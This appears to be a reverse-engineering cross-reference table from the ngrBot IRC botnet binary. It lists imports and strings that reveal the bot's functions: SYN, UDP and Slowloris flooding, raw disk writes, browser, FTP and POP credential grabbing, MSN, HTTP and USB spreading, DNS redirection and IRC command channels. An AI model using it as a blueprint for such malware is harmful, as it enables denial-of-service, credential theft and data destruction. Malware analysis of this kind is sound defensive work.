reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x9d873b	0x9e1150	import	0x9d8670	KERNEL32.dll.CloseHandle
0x9d874a	0x9e10a8	import	0x9d8670	KERNEL32.dll.LocalFree
0x9d88ae	0x9e1278	import	0x9d8790	Secur32.dll.InitializeSecurityContextW
0x9d89e0	0x9e1b18	string	0x9d89b0	Microsoft Unified Security Protocol Provider
0x9d8a32	0x9e1264	import	0x9d89b0	Secur32.dll.AcquireCredentialsHandleW
0x9d8a79	0x9e1278	import	0x9d89b0	Secur32.dll.InitializeSecurityContextW
0x9d8ac3	0x9e126c	import	0x9d89b0	Secur32.dll.QueryContextAttributesW
0x9d8b17	0x9e1270	import	0x9d89b0	Secur32.dll.DeleteSecurityContext
0x9d8b1e	0x9e1274	import	0x9d89b0	Secur32.dll.FreeCredentialsHandle
0x9d8fb5	0x9e1254	import	0x9d8f50	Secur32.dll.ApplyControlToken
0x9d9025	0x9e1270	import	0x9d8f50	Secur32.dll.DeleteSecurityContext
0x9d902f	0x9e1274	import	0x9d8f50	Secur32.dll.FreeCredentialsHandle
0x9d90a5	0x9e19ac	string	0x9d9080	firefox.exe
0x9d90be	0x9e1990	string	0x9d9080	iexplore.exe
0x9d90d8	0x9e1330	string	0x9d9080	pdef
0x9d9101	0x9e113c	import	0x9d9080	KERNEL32.dll.MultiByteToWideChar
0x9d9192	0x9e1b74	string	0x9d9080	%s.Blocked possible browser exploit pack call on URL '%s'
0x9d91f4	0x9e19ac	string	0x9d91f0	firefox.exe
0x9d920d	0x9e1990	string	0x9d91f0	iexplore.exe
0x9d9227	0x9e1330	string	0x9d91f0	pdef
0x9d92a8	0x9e1bc8	string	0x9d91f0	%s.Blocked possible browser exploit pack call on URL '%S'
0x9d9362	0x9e1174	import	0x9d9330	KERNEL32.dll.GetTickCount
0x9d938f	0x9e1188	import	0x9d9330	KERNEL32.dll.Sleep
0x9d9407	0x9e1174	import	0x9d9330	KERNEL32.dll.GetTickCount
0x9d9450	0x9e1174	import	0x9d9430	KERNEL32.dll.GetTickCount
0x9d9549	0x9e1188	import	0x9d9430	KERNEL32.dll.Sleep
0x9d9564	0x9e1174	import	0x9d9430	KERNEL32.dll.GetTickCount
0x9d95e0	0x9e1174	import	0x9d9580	KERNEL32.dll.GetTickCount
0x9d95fc	0x9e1120	import	0x9d9580	KERNEL32.dll.lstrcpyA
0x9d9602	0x9e29e0	string	0x9d9580	Mozilla/4.0
0x9d963c	0x9e29d8	string	0x9d9580	POST
0x9d964a	0x9e29d8	string	0x9d9580	POST
0x9d967f	0x9e2968	string	0x9d9580	%s / ?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nKeep-Alive: 300\r\nConnection: keep-alive\r\nContent-Length: 42\r\n
0x9d970b	0x9e1180	import	0x9d96b0	KERNEL32.dll.HeapFree
0x9d9728	0x9e10a0	import	0x9d96b0	KERNEL32.dll.lstrcpynA
0x9d9751	0x9e1180	import	0x9d96b0	KERNEL32.dll.HeapFree
0x9d9770	0x9e1174	import	0x9d96b0	KERNEL32.dll.GetTickCount
0x9d97ba	0x9e5ee4	string	0x9d96b0	[SYN]: Starting flood on "%s:%d" for %d second(s)
0x9d97f0	0x9e5f18	string	0x9d96b0	[SYN]: Finished flood on "%s:%d"
0x9d981c	0x9e1180	import	0x9d96b0	KERNEL32.dll.HeapFree
0x9d988b	0x9e1180	import	0x9d9830	KERNEL32.dll.HeapFree
0x9d98a8	0x9e10a0	import	0x9d9830	KERNEL32.dll.lstrcpynA
0x9d98d1	0x9e1180	import	0x9d9830	KERNEL32.dll.HeapFree
0x9d98f0	0x9e1174	import	0x9d9830	KERNEL32.dll.GetTickCount
0x9d993a	0x9e5e8c	string	0x9d9830	[UDP]: Starting flood on "%s:%d" for %d second(s)
0x9d9970	0x9e5ec0	string	0x9d9830	[UDP]: Finished flood on "%s:%d"
0x9d999c	0x9e1180	import	0x9d9830	KERNEL32.dll.HeapFree
0x9d9a2d	0x9e1174	import	0x9d99b0	KERNEL32.dll.GetTickCount
0x9d9a60	0x9e1174	import	0x9d99b0	KERNEL32.dll.GetTickCount
0x9d9abe	0x9e1188	import	0x9d99b0	KERNEL32.dll.Sleep
0x9d9ae7	0x9e1120	import	0x9d99b0	KERNEL32.dll.lstrcpyA
0x9d9af0	0x9e2a08	string	0x9d99b0	X-a: b\r\n
0x9d9b00	0x9e29f0	string	0x9d99b0	Connection: Close\r\n\r\n
0x9d9b0f	0x9e1184	import	0x9d99b0	KERNEL32.dll.lstrlenA
0x9d9b51	0x9e1188	import	0x9d99b0	KERNEL32.dll.Sleep
0x9d9b5e	0x9e1184	import	0x9d99b0	KERNEL32.dll.lstrlenA
0x9d9b66	0x9e1174	import	0x9d99b0	KERNEL32.dll.GetTickCount
0x9d9b7f	0x9e1188	import	0x9d99b0	KERNEL32.dll.Sleep
0x9d9bd2	0x9e1174	import	0x9d99b0	KERNEL32.dll.GetTickCount
0x9d9be4	0x9e1184	import	0x9d99b0	KERNEL32.dll.lstrlenA
0x9d9c43	0x9e1174	import	0x9d99b0	KERNEL32.dll.GetTickCount
0x9d9c9a	0x9e1180	import	0x9d9c60	KERNEL32.dll.HeapFree
0x9d9cb3	0x9e1120	import	0x9d9c60	KERNEL32.dll.lstrcpyA
0x9d9cc4	0x9e10a0	import	0x9d9c60	KERNEL32.dll.lstrcpynA
0x9d9cf9	0x9e5e30	string	0x9d9c60	[Slowloris]: Starting flood on "%s" for %d minute(s)
0x9d9d45	0x9e5e68	string	0x9d9c60	[Slowloris]: Finished flood on "%s"
0x9d9d73	0x9e1180	import	0x9d9c60	KERNEL32.dll.HeapFree
0x9d9da7	0x9e1094	import	0x9d9d90	KERNEL32.dll.VirtualAlloc
0x9d9dd0	0x9e2a14	string	0x9d9d90	\\.\PHYSICALDRIVE0
0x9d9dd5	0x9e1110	import	0x9d9d90	KERNEL32.dll.CreateFileA
0x9d9e02	0x9e1098	import	0x9d9d90	KERNEL32.dll.DeviceIoControl
0x9d9e21	0x9e109c	import	0x9d9d90	KERNEL32.dll.SetFilePointer
0x9d9e2a	0x9e1164	import	0x9d9d90	KERNEL32.dll.WriteFile
0x9d9e56	0x9e109c	import	0x9d9d90	KERNEL32.dll.SetFilePointer
0x9d9ea2	0x9e1098	import	0x9d9d90	KERNEL32.dll.DeviceIoControl
0x9d9eec	0x9e2a28	string	0x9d9ec0	00100
0x9d9f09	0x9e2a14	string	0x9d9ec0	\\.\PHYSICALDRIVE0
0x9d9f16	0x9e1110	import	0x9d9ec0	KERNEL32.dll.CreateFileA
0x9d9f2b	0x9e1098	import	0x9d9ec0	KERNEL32.dll.DeviceIoControl
0x9d9f5a	0x9e1164	import	0x9d9ec0	KERNEL32.dll.WriteFile
0x9d9f77	0x9e1150	import	0x9d9ec0	KERNEL32.dll.CloseHandle
0x9da0a2	0x9e1158	import	0x9da080	KERNEL32.dll.CreateFileW
0x9da0c0	0x9e1164	import	0x9da080	KERNEL32.dll.WriteFile
0x9da0cb	0x9e1150	import	0x9da080	KERNEL32.dll.CloseHandle
0x9da0d8	0x9e1150	import	0x9da080	KERNEL32.dll.CloseHandle
0x9da184	0x9e10c8	import	0x9da150	KERNEL32.dll.GetWindowsDirectoryW
0x9da2ab	0x9e1090	import	0x9da260	KERNEL32.dll.CreateProcessW
0x9da2c5	0x9e1174	import	0x9da2c0	KERNEL32.dll.GetTickCount
0x9da39f	0x9e1184	import	0x9da310	KERNEL32.dll.lstrlenA
0x9da3a8	0x9e57a0	string	0x9da310	30e41aa1
0x9da3b0	0x9e57a0	string	0x9da310	30e41aa1
0x9da3bb	0x9e6904	string	0x9da310	\\.\pipe\%08x_ipc
0x9da3fd	0x9e57a0	string	0x9da310	30e41aa1
0x9da40e	0x9e57a0	string	0x9da310	30e41aa1
0x9da436	0x9e119c	import	0x9da310	KERNEL32.dll.EnterCriticalSection
0x9da452	0x9e1110	import	0x9da310	KERNEL32.dll.CreateFileA
0x9da464	0x9e1198	import	0x9da310	KERNEL32.dll.LeaveCriticalSection
0x9da484	0x9e1164	import	0x9da310	KERNEL32.dll.WriteFile
0x9da48b	0x9e1150	import	0x9da310	KERNEL32.dll.CloseHandle
0x9da496	0x9e1188	import	0x9da310	KERNEL32.dll.Sleep
0x9da4a1	0x9e1198	import	0x9da310	KERNEL32.dll.LeaveCriticalSection
0x9da557	0x9e2a48	string	0x9da550	NtShutdownSystem
0x9da55c	0x9e16e8	string	0x9da550	ntdll.dll
0x9da57a	0x9e1024	import	0x9da550	ADVAPI32.dll.OpenProcessToken
0x9da588	0x9e2a34	string	0x9da550	SeShutdownPrivilege
0x9da58f	0x9e1028	import	0x9da550	ADVAPI32.dll.LookupPrivilegeValueA
0x9da5b3	0x9e102c	import	0x9da550	ADVAPI32.dll.AdjustTokenPrivileges
0x9da5b9	0x9e116c	import	0x9da550	KERNEL32.dll.GetLastError
0x9da659	0x9e10cc	import	0x9da5d0	KERNEL32.dll.CreateThread
0x9da661	0x9e2ad4	string	0x9da5d0	ngrBot Error
0x9da666	0x9e2a60	string	0x9da5d0	This binary is invalid.\r\n\r\nMain reasons:\r\n- you stupid cracker\r\n- you stupid cracker...\r\n- you stupid cracker?!\r\n
0x9da66f	0x9e12a4	import	0x9da5d0	USER32.dll.MessageBoxA
0x9da678	0x9e10f8	import	0x9da5d0	KERNEL32.dll.WaitForSingleObject
0x9da680	0x9e108c	import	0x9da5d0	KERNEL32.dll.ExitProcess
0x9da6df	0x9e1238	import	0x9da690	SHELL32.dll.SHGetSpecialFolderPathW
0x9da6ed	0x9e1728	string	0x9da690	Internet Explorer\iexplore.exe
0x9da6f9	0x9e1240	import	0x9da690	SHLWAPI.dll.PathAppendW
0x9da70a	0x9e2af0	string	0x9da690	"%s" %S
0x9da77f	0x9e1090	import	0x9da690	KERNEL32.dll.CreateProcessW
0x9da7aa	0x9e1174	import	0x9da790	KERNEL32.dll.GetTickCount
0x9da7dc	0x9e1188	import	0x9da790	KERNEL32.dll.Sleep
0x9da819	0x9e1174	import	0x9da800	KERNEL32.dll.GetTickCount
0x9da859	0x9e1188	import	0x9da800	KERNEL32.dll.Sleep
0x9da8b1	0x9e1534	string	0x9da880	msnu
0x9da8bd	0x9e1330	string	0x9da880	pdef
0x9da8c9	0x9e1b04	string	0x9da880	ffgrab
0x9da8d5	0x9e1b0c	string	0x9da880	iegrab
0x9da8e1	0x9e1a9c	string	0x9da880	ftpgrab
0x9da8ed	0x9e1a68	string	0x9da880	popgrab
0x9da8fc	0x9e13e4	string	0x9da880	bdns
0x9da908	0x9e2b1c	string	0x9da880	usbi
0x9da914	0x9e2b14	string	0x9da880	httpi
0x9da946	0x9e2b04	string	0x9da880	http
0x9da956	0x9e2b04	string	0x9da880	http
0x9da970	0x9e2b30	string	0x9da970	DnsFlushResolverCache
0x9da975	0x9e2b24	string	0x9da970	dnsapi.dll
0x9da9ed	0x9e1090	import	0x9da990	KERNEL32.dll.CreateProcessW
0x9daa39	0x9e29e0	string	0x9daa10	Mozilla/4.0
0x9daa45	0x9e1120	import	0x9daa10	KERNEL32.dll.lstrcpyA
0x9daa60	0x9e12b8	import	0x9daa10	WININET.dll.InternetOpenA
0x9daa78	0x9e1184	import	0x9daa10	KERNEL32.dll.lstrlenA
0x9daa8c	0x9e12b4	import	0x9daa10	WININET.dll.InternetOpenUrlA
0x9daac0	0x9e12b0	import	0x9daa10	WININET.dll.HttpQueryInfoA
0x9daae2	0x9e12ac	import	0x9daa10	WININET.dll.InternetQueryDataAvailable
0x9dab00	0x9e12c8	import	0x9daa10	WININET.dll.InternetReadFile
0x9dabe7	0x9e12c4	import	0x9daa10	WININET.dll.InternetCloseHandle
0x9dac1a	0x9e1178	import	0x9dac00	KERNEL32.dll.HeapAlloc
0x9dac29	0x9e12bc	import	0x9dac00	WININET.dll.HttpQueryInfoW
0x9dac44	0x9e116c	import	0x9dac00	KERNEL32.dll.GetLastError
0x9dac5e	0x9e11a0	import	0x9dac00	KERNEL32.dll.HeapReAlloc
0x9dac80	0x9e2b48	string	0x9dac00	POST
0x9dac85	0x9e1134	import	0x9dac00	KERNEL32.dll.lstrcmpW
0x9dac99	0x9e1180	import	0x9dac00	KERNEL32.dll.HeapFree
0x9dacb2	0x9e1180	import	0x9dac00	KERNEL32.dll.HeapFree
0x9dad0a	0x9e1178	import	0x9dacd0	KERNEL32.dll.HeapAlloc
0x9dad1a	0x9e12c0	import	0x9dacd0	WININET.dll.InternetQueryOptionW
0x9dad31	0x9e116c	import	0x9dacd0	KERNEL32.dll.GetLastError
0x9dad4f	0x9e11a0	import	0x9dacd0	KERNEL32.dll.HeapReAlloc
0x9dad80	0x9e112c	import	0x9dacd0	KERNEL32.dll.WideCharToMultiByte
0x9dadb3	0x9e1120	import	0x9dacd0	KERNEL32.dll.lstrcpyA
0x9dade6	0x9e1180	import	0x9dacd0	KERNEL32.dll.HeapFree
0x9dae05	0x9e1184	import	0x9dae00	KERNEL32.dll.lstrlenA
0x9dae13	0x9e1178	import	0x9dae00	KERNEL32.dll.HeapAlloc
0x9dae69	0x9e1120	import	0x9dae00	KERNEL32.dll.lstrcpyA
0x9dae7f	0x9e1088	import	0x9dae00	KERNEL32.dll.lstrcatA
0x9daed5	0x9e1180	import	0x9dae00	KERNEL32.dll.HeapFree
0x9daeeb	0x9e1180	import	0x9dae00	KERNEL32.dll.HeapFree
0x9daf58	0x9e1120	import	0x9dae00	KERNEL32.dll.lstrcpyA
0x9daf70	0x9e1180	import	0x9dae00	KERNEL32.dll.HeapFree
0x9dafaf	0x9e1184	import	0x9dafa0	KERNEL32.dll.lstrlenA
0x9dafcb	0x9e1178	import	0x9dafa0	KERNEL32.dll.HeapAlloc
0x9db024	0x9e2b88	string	0x9dafa0	POST /%1023s
0x9db055	0x9e2b7c	string	0x9dafa0	Host:
0x9db08e	0x9e10a0	import	0x9dafa0	KERNEL32.dll.lstrcpynA
0x9db0d5	0x9e1178	import	0x9dafa0	KERNEL32.dll.HeapAlloc
0x9db0e3	0x9e2b74	string	0x9dafa0	HTTP
0x9db0ff	0x9e2b68	string	0x9dafa0	http://%s/
0x9db11e	0x9e2b58	string	0x9dafa0	http://%s/%s
0x9db13c	0x9e1180	import	0x9dafa0	KERNEL32.dll.HeapFree
0x9db16a	0x9e1184	import	0x9db160	KERNEL32.dll.lstrlenA
0x9db186	0x9e1178	import	0x9db160	KERNEL32.dll.HeapAlloc
0x9db199	0x9e2b98	string	0x9db160	\r\n\r\n
0x9db1d2	0x9e1178	import	0x9db160	KERNEL32.dll.HeapAlloc
0x9db1e5	0x9e10a0	import	0x9db160	KERNEL32.dll.lstrcpynA
0x9db1f8	0x9e1180	import	0x9db160	KERNEL32.dll.HeapFree
0x9db2ee	0x9db2b0	string	0x9db290	<%u2
0x9db312	0x9e117c	import	0x9db300	KERNEL32.dll.GetProcessHeap
0x9db319	0x9e1178	import	0x9db300	KERNEL32.dll.HeapAlloc
0x9db366	0x9e2bb4	string	0x9db300	lol.exe
0x9db387	0x9e10c8	import	0x9db300	KERNEL32.dll.GetWindowsDirectoryW
0x9db3a1	0x9e10b8	import	0x9db300	KERNEL32.dll.lstrcpynW
0x9db3bb	0x9e1084	import	0x9db300	KERNEL32.dll.GetVolumeInformationW
0x9db3cd	0x9e1184	import	0x9db300	KERNEL32.dll.lstrlenA
0x9db3d3	0x9e57a0	string	0x9db300	30e41aa1
0x9db3ea	0x9e57a0	string	0x9db300	30e41aa1
0x9db45b	0x9e2ba0	string	0x9db300	.exe
0x9db461	0x9e10bc	import	0x9db300	KERNEL32.dll.lstrcatW
0x9db4a9	0x9e2c18	string	0x9db480	isadmin
0x9db4ae	0x9e2c10	string	0x9db480	admin
0x9db4fe	0x9e1120	import	0x9db480	KERNEL32.dll.lstrcpyA
0x9db536	0x9e1178	import	0x9db480	KERNEL32.dll.HeapAlloc
0x9db550	0x9e10d8	import	0x9db480	KERNEL32.dll.GetVersionExA
0x9db60d	0x9e1178	import	0x9db480	KERNEL32.dll.HeapAlloc
0x9db620	0x9e68e8	string	0x9db480	http://api.wipmania.com/
0x9db63b	0x9e2be8	string	0x9db480	<br>
0x9db650	0x9e1184	import	0x9db480	KERNEL32.dll.lstrlenA
0x9db65f	0x9e1184	import	0x9db480	KERNEL32.dll.lstrlenA
0x9db67d	0x9e1080	import	0x9db480	KERNEL32.dll.GetLocaleInfoA
0x9db6a8	0x9e1128	import	0x9db480	KERNEL32.dll.lstrcmpA
0x9db6c5	0x9e1080	import	0x9db480	KERNEL32.dll.GetLocaleInfoA
0x9db6f9	0x9e1080	import	0x9db480	KERNEL32.dll.GetLocaleInfoA
0x9db741	0x9e1178	import	0x9db480	KERNEL32.dll.HeapAlloc
0x9db7f1	0x9e2bd0	string	0x9db480	n%s{%s|%s%s}%s
0x9db80b	0x9e2bc4	string	0x9db480	{%s|%s%s}%s
0x9db8be	0x9e2bd0	string	0x9db480	n%s{%s|%s%s}%s
0x9db8d5	0x9e2bc4	string	0x9db480	{%s|%s%s}%s
0x9db94b	0x9e2c20	string	0x9db900	127.0.0.1
0x9db975	0x9e1188	import	0x9db900	KERNEL32.dll.Sleep
0x9db9bc	0x9e119c	import	0x9db990	KERNEL32.dll.EnterCriticalSection
0x9db9d1	0x9e12a0	import	0x9db990	USER32.dll.wvsprintfA
0x9db9f2	0x9e1198	import	0x9db990	KERNEL32.dll.LeaveCriticalSection
0x9dba42	0x9e12a0	import	0x9dba00	USER32.dll.wvsprintfA
0x9dba56	0x9e5d4c	string	0x9dba00	PRIVMSG %s :%s\r\n
0x9dba7f	0x9e5c54	string	0x9dba70	PASS %s\r\n
0x9dba9c	0x9e5d24	string	0x9dba70	NICK %s\r\n
0x9dbab4	0x9e5d10	string	0x9dba70	USER %s 0 0 :%s\r\n
0x9dbb52	0x9e1184	import	0x9dbb30	KERNEL32.dll.lstrlenA
0x9dbba0	0x9e1128	import	0x9dbb80	KERNEL32.dll.lstrcmpA
0x9dbbff	0x9e1128	import	0x9dbbb0	KERNEL32.dll.lstrcmpA
0x9dbc2c	0x9e57a0	string	0x9dbbb0	30e41aa1
0x9dbc36	0x9e5d88	string	0x9dbbb0	[v="%s" c="%s" h="%s" p="%S"]
0x9dbc89	0x9e2cf4	string	0x9dbbb0	reconnecting
0x9dbc8e	0x9e5d60	string	0x9dbbb0	QUIT :%s\r\n
0x9dbcc3	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dbce1	0x9e1180	import	0x9dbbb0	KERNEL32.dll.HeapFree
0x9dbcec	0x9e2cf4	string	0x9dbbb0	reconnecting
0x9dbcf1	0x9e5d60	string	0x9dbbb0	QUIT :%s\r\n
0x9dbd28	0x9e2ce8	string	0x9dbbb0	exiting
0x9dbd2d	0x9e5d60	string	0x9dbbb0	QUIT :%s\r\n
0x9dbd5a	0x9e2cdc	string	0x9dbbb0	removing
0x9dbd5f	0x9e5d60	string	0x9dbbb0	QUIT :%s\r\n
0x9dbdb2	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbdc6	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dbdd5	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dbe0c	0x9e2ccc	string	0x9dbbb0	#new
0x9dbe18	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbe2a	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dbe72	0x9e2cbc	string	0x9dbbb0	#admin
0x9dbe79	0x9e2cb4	string	0x9dbbb0	#user
0x9dbe7f	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbe91	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dbecb	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbee7	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbefa	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dbf0c	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dbf5f	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbf73	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dbf82	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dbfa6	0x9e2ccc	string	0x9dbbb0	#new
0x9dbfb2	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dbfc4	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dc00c	0x9e2cbc	string	0x9dbbb0	#admin
0x9dc013	0x9e2cb4	string	0x9dbbb0	#user
0x9dc019	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc02b	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dc065	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc081	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc094	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dc0a6	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dc0c3	0x9e5874	string	0x9dbbb0	stop
0x9dc0e3	0x9e5840	string	0x9dbbb0	stats
0x9dc124	0x9e6054	string	0x9dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x9dc156	0x9e6080	string	0x9dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x9dc192	0x9e6054	string	0x9dbbb0	[usb="%d" msn="%d" http="%d" total="%d"]
0x9dc1b9	0x9e6080	string	0x9dbbb0	[ftp="%d" pop="%d" http="%d" total="%d"]
0x9dc1d2	0x9e5850	string	0x9dbbb0	logins
0x9dc225	0x9e1180	import	0x9dbbb0	KERNEL32.dll.HeapFree
0x9dc25e	0x9e2c88	string	0x9dbbb0	[Logins]: Cleared %d logins
0x9dc283	0x9e2c80	string	0x9dbbb0	%s|%s
0x9dc2c2	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc2d2	0x9e1178	import	0x9dbbb0	KERNEL32.dll.HeapAlloc
0x9dc2ea	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc321	0x9e60d0	string	0x9dbbb0	[RSOCK4]: Stopped rsock4
0x9dc33f	0x9e5848	string	0x9dbbb0	speed
0x9dc354	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc3fd	0x9e57f0	string	0x9dbbb0	jps獵 blocks=Basic Latin,CJK Unified Ideographs
0x9dc449	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dc4bf	0x9e5d30	string	0x9dbbb0	JOIN %s %s\r\n
0x9dc550	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dc572	0x9e5d40	string	0x9dbbb0	PART %s\r\n
0x9dc5d0	0x9e1330	string	0x9dbbb0	pdef
0x9dc5e2	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc5f7	0x9e1178	import	0x9dbbb0	KERNEL32.dll.HeapAlloc
0x9dc60e	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc61f	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc633	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dc642	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dc679	0x9e1330	string	0x9dbbb0	pdef
0x9dc68f	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc6d0	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc6e0	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc706	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dc73d	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc743	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc77e	0x9e14f8	string	0x9dbbb0	msnmsg
0x9dc7ce	0x9e5f50	string	0x9dbbb0	[MSN]: Updated MSN spread message to "%s"
0x9dc7e7	0x9e5808	string	0x9dbbb0	msn.int
0x9dc826	0x9e1500	string	0x9dbbb0	msnint
0x9dc859	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc876	0x9e5f7c	string	0x9dbbb0	[MSN]: Updated MSN spread interval to "%s"
0x9dc88f	0x9e5810	string	0x9dbbb0	http.set
0x9dc8b5	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc8d0	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dc8f5	0x9e1088	import	0x9dbbb0	KERNEL32.dll.lstrcatA
0x9dc92c	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dc955	0x9e2b04	string	0x9dbbb0	http
0x9dc972	0x9e5fa8	string	0x9dbbb0	[HTTP]: Updated HTTP spread message to "%s"
0x9dc97f	0x9e581c	string	0x9dbbb0	http.int
0x9dc9c0	0x9e2b04	string	0x9dbbb0	http
0x9dc9df	0x9e5ff8	string	0x9dbbb0	[HTTP]: Updated HTTP spread interval to "%s"
0x9dc9f8	0x9e5828	string	0x9dbbb0	http.inj
0x9dca16	0x9e2b14	string	0x9dbbb0	httpi
0x9dca26	0x9e2c70	string	0x9dbbb0	enabled
0x9dca2b	0x9e5fd4	string	0x9dbbb0	[HTTP]: Injected value is now %s.
0x9dca43	0x9e2b14	string	0x9dbbb0	httpi
0x9dca53	0x9e2c64	string	0x9dbbb0	disabled
0x9dca58	0x9e5fd4	string	0x9dbbb0	[HTTP]: Injected value is now %s.
0x9dca71	0x9e5838	string	0x9dbbb0	mdns
0x9dca9f	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dcadd	0x9e1178	import	0x9dbbb0	KERNEL32.dll.HeapAlloc
0x9dcaf3	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dcb36	0x9e13e4	string	0x9dbbb0	bdns
0x9dcb56	0x9e2c44	string	0x9dbbb0	[DNS]: Redirecting "%s" to "%s"
0x9dcb76	0x9e13e4	string	0x9dbbb0	bdns
0x9dcb7b	0x9e13dc	string	0x9dbbb0	block
0x9dcb95	0x9e6040	string	0x9dbbb0	[DNS]: Blocked "%s"
0x9dcbf4	0x9e6028	string	0x9dbbb0	[Visit]: Visited "%s"
0x9dcc0a	0x9e627c	string	0x9dbbb0	[Visit]: Error visitng "%s"
0x9dcc3a	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dcc8b	0x9e2c34	string	0x9dbbb0	%s|%s|%s
0x9dcca8	0x9e2c80	string	0x9dbbb0	%s|%s
0x9dccd4	0x9e1178	import	0x9dbbb0	KERNEL32.dll.HeapAlloc
0x9dcce4	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dcd11	0x9e5860	string	0x9dbbb0	slow
0x9dcd27	0x9e2c80	string	0x9dbbb0	%s|%s
0x9dcd47	0x9e1184	import	0x9dbbb0	KERNEL32.dll.lstrlenA
0x9dcd58	0x9e1178	import	0x9dbbb0	KERNEL32.dll.HeapAlloc
0x9dcd70	0x9e1120	import	0x9dbbb0	KERNEL32.dll.lstrcpyA
0x9dcdfc	0x9e1534	string	0x9dbbb0	msnu
0x9dce55	0x9e1330	string	0x9dbbb0	pdef
0x9dce66	0x9e1b04	string	0x9dbbb0	ffgrab
0x9dce7b	0x9e1b0c	string	0x9dbbb0	iegrab
0x9dce8c	0x9e1a9c	string	0x9dbbb0	ftpgrab
0x9dce9d	0x9e1a68	string	0x9dbbb0	popgrab
